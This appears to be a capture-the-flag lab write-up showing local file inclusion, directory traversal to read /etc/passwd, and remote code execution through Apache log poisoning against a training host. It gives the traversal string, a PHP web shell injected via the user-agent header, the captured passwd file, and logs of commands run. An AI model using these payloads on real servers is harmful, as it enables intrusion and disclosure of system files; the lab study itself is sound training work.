```
IP = 10.10.49.1
```

## Local File Inclusion
-----------------------------------------------------

+ Add IP to env variable for simplicity. `export IP=10.10.49.1`
+ Local file inclusion at http://10.10.49.1/lfi/lfi.php
+ Tested using `?page=home.html` URL param.
+ Read `/etc/passwd` using page url variable.

## Local File Inclusion using Directory Traversal
-----------------------------------------------------

+ Directory traversal at http://10.10.49.1/lfi2/lfi.php
+ `?page=home.html` doesn't work.
+ LFI successful using `?page=../../../../../etc/passwd`.

## RCE using LFI and Log Poisoning
-----------------------------------------------------

+ Exploited the LFI at http://10.10.49.1/lfi/lfi.php to check apache log access.
+ Can successfully read logs. 
+ Fired up burp suite to craft a malicious payload supplied at user agent field.
+ Supplied `<?php system($_GET['lfi']); ?>` at user agent be able to execute commands at http://10.10.49.1/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=

## Artifacts
-----------------------------------------------------

+ `/etc/passwd` contents
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash 
```
+ Apache log snippet after LFI RCE
```
...
10.6.27.197 - - [09/Oct/2020:12:31:16 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 826 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:33:35 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 835 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)  Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:35:06 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls HTTP/1.1" 200 845 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:35:47 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 861 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)  Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:36:10 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls HTTP/1.1" 200 911 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:36:46 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-a HTTP/1.1" 200 922 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:37:08 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 905 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)  Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:37:25 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-a HTTP/1.1" 200 954 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.6.27.197 - - [09/Oct/2020:12:39:30 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 926 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) THM{a352a5c2acfd22251c3a94105b718fea}
 Firefox/78.0"
...
```

